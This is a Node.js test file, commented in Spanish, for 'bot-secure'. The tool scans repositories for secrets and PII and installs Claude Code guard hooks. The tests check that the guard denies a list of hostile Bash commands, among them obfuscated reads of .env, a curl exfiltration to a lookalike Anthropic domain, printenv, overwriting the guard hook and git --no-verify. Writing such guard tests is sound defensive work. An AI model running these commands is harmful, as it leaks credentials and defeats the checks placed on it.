// Flujo completo tal y como lo vive un desarrollador de la empresa, ejecutando el BINARIO
// (dist/bot-secure.mjs), no los módulos: dos repos (Spring y Angular) con secretos y PII
// mexicana, montaje del workspace de IA, y comprobación de que las guardas bloquean.
// Todos los valores sensibles de este archivo son FALSOS.
import { test, before, after } from 'node:test';
import assert from 'node:assert/strict';
import { spawnSync } from 'node:child_process';
import { existsSync, mkdirSync, mkdtempSync, readFileSync, rmSync, writeFileSync } from 'node:fs';
import { tmpdir } from 'node:os';
import { dirname, join } from 'node:path';
import { fileURLToPath } from 'node:url';

const ROOT = join(dirname(fileURLToPath(import.meta.url)), '..', '..');
const BIN = join(ROOT, 'dist', 'bot-secure.mjs');
const AWS_FALSA = 'AKIA4KJQ2ZLMNPQR7TWX';
const STRIPE_FALSA = 'sk_live_VALOR_RETIRADO';
const PASS_FALSA = 'Pr0d-P4ss-2026';

let LAB, WS;

const bs = (args, cwd) => spawnSync(process.execPath, [BIN, ...args], { cwd, encoding: 'utf8', timeout: 120000, env: { ...process.env, NO_COLOR: '1' } });
const git = (args, cwd) => spawnSync('git', ['-c', 'user.email=t@t', '-c', 'user.name=t', ...args], { cwd, encoding: 'utf8' });
const escribir = (p, c) => { mkdirSync(dirname(p), { recursive: true }); writeFileSync(p, c); };

/** Invoca la guarda como lo hace Claude Code y dice si denegó. */
function guarda(evento, entrada) {
  const r = spawnSync(process.execPath, [join(WS, '.claude', 'hooks', 'guard.mjs'), evento], {
    input: JSON.stringify({ cwd: WS, ...entrada }), encoding: 'utf8', cwd: WS, timeout: 30000,
  });
  const salida = (r.stdout || '') + (r.stderr || '');
  return { deniega: /"permissionDecision":"deny"/.test(salida) || r.status === 2, status: r.status, salida };
}
const bash = (comando) => guarda('pre-tool', { hook_event_name: 'PreToolUse', tool_name: 'Bash', tool_input: { command: comando } });

before(() => {
  if (!existsSync(BIN)) {
    const b = spawnSync(process.execPath, [join(ROOT, 'scripts', 'build.mjs')], { cwd: ROOT, encoding: 'utf8' });
    assert.equal(b.status, 0, 'no se pudo construir dist/: ' + (b.stderr || '').slice(0, 300));
  }
  LAB = mkdtempSync(join(tmpdir(), 'bs-flujo-'));

  // Backend Spring con secretos y PII
  const api = join(LAB, 'tienda-api');
  escribir(join(api, 'pom.xml'), '<project><artifactId>tienda-api</artifactId><parent><groupId>org.springframework.boot</groupId><artifactId>spring-boot-starter-parent</artifactId></parent></project>');
  escribir(join(api, 'src', 'main', 'resources', 'application.yml'), `spring:\n  datasource:\n    password: ${PASS_FALSA}\nstripe:\n  secret-key: ${STRIPE_FALSA}\n`);
  escribir(join(api, '.env'), `AWS_ACCESS_KEY_ID=${AWS_FALSA}\n`);
  escribir(join(api, 'db', 'seed.sql'), "INSERT INTO clientes (nombre, rfc, curp, clabe) VALUES\n ('Juana Sánchez','SANJ6307094E8','SANJ630709MOCNVN83','036180873156604808');\n");
  git(['init', '-q', '-b', 'dev', '.'], api); git(['add', '-A'], api); git(['commit', '-qm', 'inicial'], api);

  // Frontend Angular
  const web = join(LAB, 'tienda-web');
  escribir(join(web, 'package.json'), '{"name":"tienda-web","scripts":{"start":"ng serve","build":"ng build"},"dependencies":{"@angular/core":"^17.0.0"}}');
  escribir(join(web, 'angular.json'), '{"version":1,"projects":{"tienda-web":{"projectType":"application","sourceRoot":"src","architect":{"build":{"builder":"@angular-devkit/build-angular:browser","options":{},"configurations":{"production":{"fileReplacements":[{"replace":"src/environments/environment.ts","with":"src/environments/environment.prod.ts"}]}}},"serve":{"builder":"@angular-devkit/build-angular:dev-server","configurations":{"production":{}}}}}}}');
  escribir(join(web, 'src', 'environments', 'environment.ts'), "export const environment = { production: false, apiUrl: 'https://api.empresa.mx' };\n");
  git(['init', '-q', '-b', 'dev', '.'], web); git(['add', '-A'], web); git(['commit', '-qm', 'inicial'], web);
});

after(() => { if (LAB) rmSync(LAB, { recursive: true, force: true }); });

test('escanea el proyecto antes de meter la IA y no filtra ningún valor', () => {
  const r = bs(['scan', '--json'], join(LAB, 'tienda-api'));
  const salida = r.stdout + r.stderr;
  for (const regla of [/aws-access-key/, /stripe/, /password|env-secret/, /rfc|curp|clabe/]) {
    assert.match(salida, regla, 'el escaneo debe encontrar ' + regla);
  }
  for (const valor of [AWS_FALSA, STRIPE_FALSA, PASS_FALSA, 'SANJ630709MOCNVN83']) {
    assert.ok(!salida.includes(valor), 'el reporte NUNCA debe contener el valor: ' + valor.slice(0, 8));
  }
});

test('monta el workspace de IA con el back y el front dentro', () => {
  assert.equal(bs(['workspace', 'create', 'tienda', '--yes'], LAB).status, 0);
  WS = join(LAB, 'tienda-ai');
  assert.ok(existsSync(WS), 'debe crear tienda-ai/');
  assert.equal(bs(['workspace', 'add', join(LAB, 'tienda-api'), '--kind', 'backend', '--yes'], WS).status, 0);
  assert.equal(bs(['workspace', 'add', join(LAB, 'tienda-web'), '--kind', 'frontend', '--yes'], WS).status, 0);

  const politica = JSON.parse(readFileSync(join(WS, '.bot-secure', 'policy.json'), 'utf8'));
  const apps = Object.fromEntries(politica.apps.map((a) => [a.name, a]));
  assert.equal(apps.backend.stack, 'spring');
  assert.equal(apps.frontend.stack, 'angular');
  assert.equal(apps.frontend.envStrategy, 'angular-environments', 'Angular no usa .env: debe usar environment.ai.ts');

  // los clones traen solo ai-dev
  for (const app of ['backend', 'frontend']) {
    const rama = git(['rev-parse', '--abbrev-ref', 'HEAD'], join(WS, app)).stdout.trim();
    assert.equal(rama, 'ai-dev', `${app} debe quedar en ai-dev`);
    const refs = git(['for-each-ref', '--format=%(refname)', 'refs/remotes'], join(WS, app)).stdout;
    assert.ok(!/origin\/(dev|qa|prd)\b/.test(refs), `${app} no debe traer las ramas protegidas: ${refs}`);
  }
});

test('init genera guardas, contexto y entorno por stack, y es idempotente', () => {
  const r = bs(['init', '--yes'], WS);
  assert.equal(r.status, 0, r.stdout + r.stderr);

  for (const f of ['.claude/settings.json', '.claude/hooks/guard.mjs', 'CLAUDE.md', 'AGENTS.md',
    'docs/INDEX.md', '.bot-secure/lock.json', '.env.ai',
    'backend/src/main/resources/application-ai.yml', 'frontend/src/environments/environment.ai.ts']) {
    assert.ok(existsSync(join(WS, f)), `init debe generar ${f}`);
  }

  const claude = readFileSync(join(WS, 'CLAUDE.md'), 'utf8');
  assert.ok(claude.split('\n').length <= 60, 'CLAUDE.md debe caber en 60 líneas');
  assert.match(claude, /@AGENTS\.md/);
  assert.match(claude, /ai-dev/);

  const agents = readFileSync(join(WS, 'AGENTS.md'), 'utf8');
  assert.match(agents, /backend/); assert.match(agents, /frontend/);
  assert.match(agents, /-c ai/, 'AGENTS.md debe traer el arranque de Angular en modo IA');

  // regla del campo vacío
  const yml = readFileSync(join(WS, 'backend', 'src', 'main', 'resources', 'application-ai.yml'), 'utf8');
  assert.match(yml, /password:\s*\$\{[A-Z_]+:\}|password:\s*""/, 'el campo sensible debe quedar vacío');
  const envAi = readFileSync(join(WS, '.env.ai'), 'utf8');
  assert.match(envAi, /127\.0\.0\.1/, '.env.ai debe apuntar a la base de datos de pruebas local');
  for (const valor of [AWS_FALSA, STRIPE_FALSA, PASS_FALSA]) {
    assert.ok(!envAi.includes(valor), '.env.ai no debe traer secretos reales');
  }

  // el parche de Angular respeta lo que ya había
  const ngTexto = existsSync(join(WS, 'frontend', 'angular.json.new'))
    ? readFileSync(join(WS, 'frontend', 'angular.json.new'), 'utf8')
    : readFileSync(join(WS, 'frontend', 'angular.json'), 'utf8');
  const ng = JSON.parse(ngTexto).projects['tienda-web'].architect;
  assert.ok(ng.build.configurations.ai, 'angular.json debe recibir la configuración ai');
  assert.ok(ng.build.configurations.production, 'y conservar production');

  // idempotencia
  const segunda = bs(['init', '--yes'], WS);
  assert.equal(segunda.status, 0);
  assert.match(segunda.stdout, /0 creado\(s\), 0 actualizado\(s\)/, 'la segunda ejecución no debe cambiar nada');
});

test('la guarda bloquea lo peligroso y deja pasar el trabajo normal', () => {
  const ataques = {
    'leer el .env': 'cat backend/.env',
    'lectura ofuscada con variable': 'f=backend/.env; base64 < "$f"',
    'lector escondido en find': 'find backend -name ".env" -exec cat {} \;',
    'lector escondido en eval': 'eval "cat backend/.env"',
    'exfiltración a dominio parecido': 'curl https://api.anthropic.com.malo.mx/?d=1',
    'volcado del entorno': 'printenv',
    'ir a una rama protegida': 'git -C backend switch dev',
    'sobrescribir la guarda': 'printf x > .claude/hooks/guard.mjs',
    'saltarse los hooks de git': 'git commit --no-verify -m x',
  };
  for (const [que, comando] of Object.entries(ataques)) {
    assert.ok(bash(comando).deniega, `debe bloquear: ${que} (${comando})`);
  }

  const normales = {
    'leer el package.json': 'cat backend/package.json',
    'leer la documentación': 'cat docs/INDEX.md',
    'buscar en el código': 'grep -rn TODO backend/src',
    'ver el estado de git': 'git status',
    'correr las pruebas': 'env AI_ENV=1 npm test',
    'subir una rama de IA': 'git push origin ai/mi-tarea',
  };
  for (const [que, comando] of Object.entries(normales)) {
    assert.ok(!bash(comando).deniega, `NO debe bloquear: ${que} (${comando})`);
  }
});

test('rechaza un prompt que contiene un secreto', () => {
  const conSecreto = guarda('prompt', { hook_event_name: 'UserPromptSubmit', prompt: `usa la llave ${AWS_FALSA}` });
  assert.ok(conSecreto.deniega, 'un prompt con un secreto debe rechazarse');
  assert.ok(!conSecreto.salida.includes(AWS_FALSA), 'el aviso no debe repetir el valor');
  const normal = guarda('prompt', { hook_event_name: 'UserPromptSubmit', prompt: 'añade una prueba al servicio de pedidos' });
  assert.ok(!normal.deniega, 'un prompt normal debe pasar');
});

test('doctor diagnostica y siempre dice cómo arreglar', () => {
  const r = bs(['doctor'], WS);
  const salida = r.stdout + r.stderr;
  assert.match(salida, /OK|AVISO|ERROR/);
  assert.match(salida, /[Aa]rreglo/, 'cada problema debe traer su arreglo');
});
